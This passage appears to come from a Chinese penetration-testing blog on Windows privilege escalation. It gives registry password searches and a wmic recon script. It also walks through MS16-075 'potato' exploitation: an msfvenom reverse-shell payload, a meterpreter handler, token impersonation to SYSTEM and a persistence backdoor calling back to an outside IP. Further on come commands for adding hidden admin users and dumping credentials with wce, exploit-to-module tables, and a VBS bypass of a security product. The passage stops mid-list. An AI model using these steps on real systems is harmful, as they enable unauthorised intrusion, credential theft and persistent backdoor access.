<h3 id="12-注册表关键字搜索，password为关键字，可以是vnc等敏感关键字"><a href="#12-注册表关键字搜索，password为关键字，可以是vnc等敏感关键字" class="headerlink" title="12. 注册表关键字搜索，password为关键字，可以是vnc等敏感关键字"></a>12. 注册表关键字搜索，password为关键字，可以是vnc等敏感关键字</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM /f password /t REG_SZ /s </span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure>
<p>###13.系统权限配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cacls c:\ </span><br><span class="line">cacls c:\windows\ma.exe 查看ma.exe的权限配置</span><br></pre></td></tr></table></figure></p>
<h3 id="14-自动收集系统有用信息脚本"><a href="#14-自动收集系统有用信息脚本" class="headerlink" title="14.自动收集系统有用信息脚本"></a>14.自动收集系统有用信息脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f <span class="string">"delims="</span> %%A <span class="keyword">in</span> (<span class="string">'dir /s /b %WINDIR%\system32\*htable.xsl'</span>) <span class="keyword">do</span> <span class="built_in">set</span> <span class="string">"var=%%A"</span> </span><br><span class="line">wmic process get CSName,Description,ExecutablePath,ProcessId /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic USERACCOUNT list full /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic group list full /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic nicconfig <span class="built_in">where</span> IPEnabled=<span class="string">'true'</span> get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic netuse list full /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic startup get Caption,Command,Location,User /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /format:<span class="string">"%var%"</span> &gt;&gt; out.html</span><br></pre></td></tr></table></figure>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2018/01/15/MS16-075提权/" title="MS16-075提权" itemprop="url">MS16-075提权</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2018-01-15T10:37:51.000Z" itemprop="datePublished"> 发表于 2018-01-15</time>
    
  </p>
</header>
    <div class="article-content">
        
        <blockquote>
<p>目标IP:192.168.163.134<br>接收反弹的IP：192.168.163.129  //注意：必须是外网IP<br>本机IP：192.168.163.120</p>
</blockquote>
<h3 id="1，在本机MSF框架执行："><a href="#1，在本机MSF框架执行：" class="headerlink" title="1，在本机MSF框架执行："></a>1，在本机MSF框架执行：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.163.134  LPORT=3306 -f exe -o 3306.exe</span><br></pre></td></tr></table></figure>
<p><img src="http://opgnaclz6.bkt.clouddn.com/6.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<p>其中windows/meterpreter/reverse_tcp反弹端口类型，lhost是反弹连接的服务器Ip地址，注意该ip地址必须是独立服务器，或者必须是外网端口映射，换句话说，就是反弹必须能够接收，lport为反弹的端口，3306为生成的程序.</p>
<h3 id="2，在监听服务器上执行监听命令"><a href="#2，在监听服务器上执行监听命令" class="headerlink" title="2，在监听服务器上执行监听命令"></a>2，在监听服务器上执行监听命令</h3><p>（1）启动msf<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Msfconsole</span><br></pre></td></tr></table></figure></p>
<p> <img src="http://opgnaclz6.bkt.clouddn.com/7.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<p> （2）配置meterpreter参数<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use exploit/multi/handler</span><br><span class="line">meterpreter &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">meterpreter &gt; <span class="built_in">set</span> LHOST 192.233.23.23</span><br><span class="line">meterpreter &gt; <span class="built_in">set</span> LPORT 4433</span><br><span class="line">Exploit</span><br></pre></td></tr></table></figure></p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/8.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<p>注：（如果反弹回来不是目标，则background再exploit）</p>
<h3 id="3，上传3306-exe程序到目标服务器及执行"><a href="#3，上传3306-exe程序到目标服务器及执行" class="headerlink" title="3，上传3306.exe程序到目标服务器及执行"></a>3，上传3306.exe程序到目标服务器及执行</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/9.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="4上传ms16-075文件"><a href="#4上传ms16-075文件" class="headerlink" title="4上传ms16-075文件"></a>4上传ms16-075文件</h3><p>通过webshll上传potato.exe文件，或者在msf下面执行命令上传：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /root/potato.exe C:\\inetpub\\wwwroot\\dede</span><br></pre></td></tr></table></figure></p>
<p>查看当前目录</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/10.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<p>如图：已经再当前目录就不需要跳转目录了，如果不是则<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\\inetpub\\wwwroot\\dede</span><br><span class="line">meterpreter &gt; use incognito</span><br></pre></td></tr></table></figure></p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/11.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<p>如图已经返回SYSTEM了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">meterpreter &gt; execute -cH -f ./potato.exe</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; impersonate_token “NT AUTHORITY\\SYSTEM”</span><br></pre></td></tr></table></figure></p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/12.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>如图，第一次我执行NT AUTHORITY\SYSTEM失败了，因为少了一个/<br>meterpreter &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br>得到SYSTEM后你可以进shell添加管理员账户密码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure></p>
<p>或者留下后门<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run?persistence?-X?-i?10?-p?6666?-r?192.168.163.129</span><br></pre></td></tr></table></figure></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2018/01/15/windows提权准备/" title="windows提权准备" itemprop="url">windows提权准备</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2018-01-15T10:37:51.000Z" itemprop="datePublished"> 发表于 2018-01-15</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h3 id="window提权基础"><a href="#window提权基础" class="headerlink" title="window提权基础"></a>window提权基础</h3><ol>
<li><p>收集并编译相关POC</p>
</li>
<li><p>若操作系统有杀毒软件以及安全防护软件，则需要对提权POC进行免杀，否则进行下一步。</p>
</li>
<li><p>上传POC</p>
</li>
<li><p>有webshell或者反弹webshell来执行命令</p>
</li>
<li><p>搜索漏洞，根据关键字进行搜索例如MS10-061。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(1)在百度浏览器中搜索“MS10-061 site:exploit-db.com”</span><br><span class="line"></span><br><span class="line">(2)packetstormsecurity网站搜索</span><br><span class="line"></span><br><span class="line">https://packetstormsecurity.com/search/?q=MS16-016</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>(3)安全焦点，其BugTraq是一个出色的漏洞和exploit数据源，可以通过CVE编号，或者产品信息漏洞直接搜索。网址：<a href="http://www.securityfocus.com/bid。" target="_blank" rel="noopener">http://www.securityfocus.com/bid。</a></p>
<h3 id="使用msf平台搜索可利用POC"><a href="#使用msf平台搜索可利用POC" class="headerlink" title="使用msf平台搜索可利用POC"></a>使用msf平台搜索可利用POC</h3><ol>
<li>搜索poc</li>
</ol>
<p>在kali中打开msf或者执行“/usr/bin/msfconsole”，在出来的命令提示符下使用命令进行搜索：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">search ms08 </span><br><span class="line">search ms09 </span><br><span class="line">search ms10 </span><br><span class="line">search ms11 </span><br><span class="line">search ms12 </span><br><span class="line">search ms13 </span><br><span class="line">search ms14 </span><br><span class="line">search ms15 </span><br><span class="line">search ms16 </span><br><span class="line">search ms17</span><br></pre></td></tr></table></figure></p>
<p>以上命令将搜索2008年至2017年的所有可用的Windows下的exploit，例如搜索2015年的exploit，如图1所示。</p>
<p>搜索2015年所有可用的0day</p>
<p>图1搜索2015年所有可用的0day</p>
<ol start="2">
<li>查看相关漏洞情况</li>
</ol>
<p>可以通过微软官方网站查看漏洞对应的版本，利用方式为<a href="https://technet.microsoft.com/library/security/漏洞号，查看ms08-068则其网页打开方式为：https://technet.microsoft.com/library/security/ms08-068，如果显示为严重则表明可以被利用。" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/漏洞号，查看ms08-068则其网页打开方式为：https://technet.microsoft.com/library/security/ms08-068，如果显示为严重则表明可以被利用。</a></p>
<h3 id="实施提权"><a href="#实施提权" class="headerlink" title="实施提权"></a>实施提权</h3><p>执行命令。比如可利用poc文件为poc.exe，则可以使用如下的一些命令提权：</p>
<p>(1)直接执行木马。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc.exe ma.exe</span><br></pre></td></tr></table></figure></p>
<p>(2)添加用户<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poc.exe <span class="string">"net user antian365 1qaz2wsx /add"</span> </span><br><span class="line">poc.exe <span class="string">"net localgroup administrators antian365 /add"</span></span><br></pre></td></tr></table></figure></p>
<p>(3)获取明文密码或者哈希值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poc.exe <span class="string">"wce32.exe -w"</span>  </span><br><span class="line">poc.exe <span class="string">"wce64.exe -w"</span> </span><br><span class="line">poc.exe <span class="string">"wce32"</span></span><br></pre></td></tr></table></figure></p>
<h3 id="相关资源下载"><a href="#相关资源下载" class="headerlink" title="相关资源下载"></a>相关资源下载</h3><ol>
<li>Tools下载</li>
</ol>
<p>wce下载：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://www.ampliasecurity.com/research/windows-credentials-editor/</span><br><span class="line">http://www.ampliasecurity.com/research/wce_v1_42beta_x32.zip</span><br><span class="line">http://www.ampliasecurity.com/research/wce_v1_42beta_x64.zip</span><br><span class="line">sysinternals ：https://technet.microsoft.com/en-us/sysinternals/bb842062</span><br><span class="line">mimikatz ：http://blog.gentilkiwi.com/mimikatz</span><br><span class="line">python ：https://www.python.org/downloads/windows/</span><br></pre></td></tr></table></figure></p>
<ol start="2">
<li>搜索漏洞和shellcode<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://www.exploit-db.com</span><br><span class="line">http://1337day.com</span><br><span class="line">http://0day.today</span><br><span class="line">http://www.securityfocus.com</span><br><span class="line">http://seclists.org/fulldisclosure/</span><br><span class="line">http://www.exploitsearch.net</span><br><span class="line">http://www.securiteam.com</span><br><span class="line">http://metasploit.com/modules/</span><br><span class="line">http://securityreason.com</span><br><span class="line">https://cxsecurity.com/exploit/</span><br><span class="line">http://securitytracker.com/</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Windows本地溢出漏洞对应表"><a href="#Windows本地溢出漏洞对应表" class="headerlink" title="Windows本地溢出漏洞对应表"></a>Windows本地溢出漏洞对应表</h3><p>Windows2003对应漏洞、编号及其影响系统及msf模块</p>
<ol>
<li><p>2007年对应漏洞、编号及其影响系统及msf模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（1）KB935966 |MS07-029  Win2000SP4、Win2003SP1/SP2 exploit/windows/dcerpc/ms07_029_msdns_zonename </span><br><span class="line">exploit/windows/smb/ms07_029_msdns_zonename </span><br><span class="line">（2）KB937894| MS07-065 WinxpSP2、Win2000SP4、WinXP-x64-SP2、Win2003SP1/SP2 </span><br><span class="line">exploit/windows/dcerpc/ms07_065_msmq </span><br><span class="line">（3）KB941568|MS07-064 Win2000SP4  </span><br><span class="line">  exploit/windows/misc/ms07_064_sami </span><br><span class="line">（4）KB944653|MS07-067 WinXPSP2、WinXP-x64-SP2、Win2003SP1/SP2</span><br></pre></td></tr></table></figure>
</li>
<li><p>2008年对应漏洞、编号及其影响系统及msf模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（1）KB958644 |MS08-067 Win2000SP4、WinXP-SP2/SP3、 </span><br><span class="line">WinXP-64-SP/SP2、Win2003SP1/SP2、Win2003-64/SP2 </span><br><span class="line">exploit/windows/smb/ms08_067_netapi </span><br><span class="line">（2）KB 957097| MS08-068 Win2000SP4、WinXP-SP2/SP3、 </span><br><span class="line">WinXP-64-SP/SP2、Win2003SP1/SP2、Win2003-64/SP2 </span><br><span class="line">exploit/windows/smb/smb_relay</span><br></pre></td></tr></table></figure>
</li>
<li><p>2009年对应漏洞、编号及其影响系统及msf模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（1）KB952004|MS09-012 PR Win2003/2008 </span><br><span class="line">（2）KB956572|MS09-012烤肉 </span><br><span class="line">（3）KB970483|MS09-020 IIS6 </span><br><span class="line">（4）KB971657|MS09-041 WinXP、Win2003提权 </span><br><span class="line">（5）KB975254|MS09-053 IIS5远程溢出，Windows2000SP4，Win2003及Win2008拒绝服务。 </span><br><span class="line">（6）KB975517 |MS09-050 Vista、Win2008-32/SP2、Win2008-64/SP2 </span><br><span class="line">exploit/windows/smb/ms09_050_smb2_negotiate_func_index</span><br></pre></td></tr></table></figure>
</li>
<li><p>2010年对应漏洞、编号及其影响系统及msf模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（1）KB977165|MS10-015 Vista、Win2003-32-64/SP2、Win2008-32-64/SP2 </span><br><span class="line">exploit/windows/local/ms10_015_kitrap0d </span><br><span class="line">（2）KB 2347290|MS10-061 Winxp3、Winxp64sp2、Win2003-32-64 SP2、Win2008-32-64 SP2 </span><br><span class="line">（3）KB2360937|MS10-084 Winxp3、Winxp64sp2、Win2003-32-64 SP2 </span><br><span class="line">（4）KB2305420| MS10-092 Win7-32-64、Win2008-32-64、Win2008R2-32-64 </span><br><span class="line">exploit/windows/local/ms10_092_schelevator </span><br><span class="line">（5）KB2124261|KB2271195  MS10-065 IIS7</span><br></pre></td></tr></table></figure>
</li>
<li><p>2011年对应漏洞、编号及其影响系统及msf模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">（1）KB2393802|MS11-011 </span><br><span class="line">Winxp32-64-SP3、Win2003-32-64-SP2、Win7-32-64-SP1、 Win2008-R2-64-SP2 </span><br><span class="line">（2）KB2478960|MS11-014 </span><br><span class="line">Winxp32-64-SP3、Win2003-32-64-SP2 </span><br><span class="line">（3）KB2507938|MS11-056 </span><br><span class="line">Winxp32-64-SP3、Win2003-32-64-SP2、Win7-32-64-SP1、 Win2008-R2-64-SP2 </span><br><span class="line">（4）KB2566454|MS11-062 </span><br><span class="line">Winxp32-64-SP3、Win2003-32-64-SP2 </span><br><span class="line">（5）KB2620712|MS11-097 </span><br><span class="line">Winxp-SP3、Win2003-SP2、Win7-64-SP1、 Win2008R2-64-SP1 </span><br><span class="line">（6）KB2503665|MS11-046 </span><br><span class="line">Winxp-SP3、Win2003-SP2、Win7-64-SP1、 Win2008R2-64-SP1 </span><br><span class="line">（7）KB2592799|MS11-080 </span><br><span class="line">Winxp-SP3、Win2003-SP2 </span><br><span class="line">exploit/windows/local/ms11_080_afdjoinleaf</span><br></pre></td></tr></table></figure>
</li>
<li><p>2012年对应漏洞、编号及其影响系统及msf模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）KB2711167| KB2707511|KB2709715|MS12-042  sysret –pid </span><br><span class="line">Winxp-SP3、Win2003-SP2、Win7-64-SP1、 Win2008R2-64-SP1、Win8-32-64、Win2012 </span><br><span class="line">（2）KB2621440|MS12-020 Winxp-SP3、Win2003-SP2、Win7-64-SP1、 Win2008R2-64-SP1、</span><br></pre></td></tr></table></figure>
</li>
<li><p>2013年对应漏洞、编号及其影响系统及msf模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）KB2778930|MS13-005 Vista-32-64-SP2、Win2008-32-64-SP2、Win7-32-64-SP1、 Win2008R2-64-SP1、Win8-32-64、Win2012 </span><br><span class="line">exploit/windows/local/ms13_005_hwnd_broadcast </span><br><span class="line">（2）KB2840221|MS13-046 WinXP-32-SP3、WinXP-64-SP2、Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-R2-32-64-SP2、Win7-32-64-SP1、 Win2008R2-64-SP1、Win8-32-64、Win2012、Win2012R2 </span><br><span class="line">（3）KB2850851|MS13-053 EPATHOBJ 0day，WinXP-32-SP3、WinXP-64-SP2、Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-R2-32-64-SP2、Win7-32-64-SP1、 Win2008R2-64-SP1、Win8-32-64、Win2012 </span><br><span class="line">exploit/windows/local/ms13_053_schlamperei</span><br></pre></td></tr></table></figure>
</li>
<li><p>2014年对应漏洞、编号及其影响系统及msf模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">（1）KB 2914368 |MS14-002 WinXPSP3、WinXP-64-SP2、Win2003-32-64-sp2 </span><br><span class="line">exploit/windows/local/ms_ndproxy </span><br><span class="line">（2）KB 2916607|MS14-009 Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ms14_009_ie_dfsvc </span><br><span class="line">（3）KB3000061|MS14-058 Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-R2-32-64-SP2、Win7-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ms14_058_track_popup_menu </span><br><span class="line">（4）KB 2989935|MS14-070 Win2003-32-64-SP2 </span><br><span class="line">exploit/windows/local/ms14_070_tcpip_ioctl</span><br></pre></td></tr></table></figure>
</li>
<li><p>2015年对应漏洞、编号及其影响系统及msf模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">（1）KB3023266|MS15-001 Win7-32-64-SP1、Win2008R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ntapphelpcachecontrol </span><br><span class="line">（2）KB3025421|MS15_004、Win7-32-64-SP1、Win2008R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ms15_004_tswbproxy </span><br><span class="line">（3）KB3041836|MS15-020、Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/smb/ms15_020_shortcut_icon_dllloader </span><br><span class="line">（4）KB3057191|MS15-051 </span><br><span class="line">Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ms15_051_client_copy_image </span><br><span class="line">（5）KB3077657|MS15-077 </span><br><span class="line">Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">（6）KB 3079904|MS15_078 </span><br><span class="line">Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ms15_078_atmfd_bof </span><br><span class="line">（7）KB3079904|MS15-097 </span><br><span class="line">Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/smb/ms15_020_shortcut_icon_dllloader</span><br></pre></td></tr></table></figure>
</li>
<li><p>2016年对应漏洞、编号及其影响系统及msf模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（1）KB3134228|MS16-014 Win2008、Win7、Win2012 </span><br><span class="line">（2）KB3124280|MS16-016 WebDAV提权漏洞，Vista-32-64-SP2、Win2008-32-64-SP2、Win7-32-64-SP1、Win2008R2-64-SP1、Win8.1-32-64、Win2012、Win2012R2、Win10-32-64 </span><br><span class="line">exploit/windows/local/ms16_016_webdav </span><br><span class="line">（3）KB3139914|MS16-032、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-32-64-SP1、Win2008R2-64-SP1、Win8.1-32-64、Win2012、Win2012R2、Win10-32-64 </span><br><span class="line">exploit/windows/local/ms16_032_secondary_logon_handle_privesc </span><br><span class="line">Windows 2003 SP2 安装了MS10-046补丁，可用ms15_020进行溢出 </span><br><span class="line">Windows 2008 SP2 (32 bits)安装了MS14-027补丁可用ms15_020进行溢出</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="过安全狗"><a href="#过安全狗" class="headerlink" title="过安全狗"></a>过安全狗</h3><ol>
<li>vbs法</li>
</ol>
<p>将以下代码保存为1.vbs然后执行cscript 1.vbs<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Set o=CreateObject( <span class="string">"Shell.Users"</span> ) </span><br><span class="line">Set z=o.create(<span class="string">"user"</span>) </span><br><span class="line">z.changePassword <span class="string">"1qaz2WSX12"</span>,<span class="string">""</span> </span><br><span class="line">z.setting(<span class="string">"AccountType"</span>)=3</span><br></pre></td></tr></table></figure></p>
<ol start="2">
<li><p>shift后门法</p>
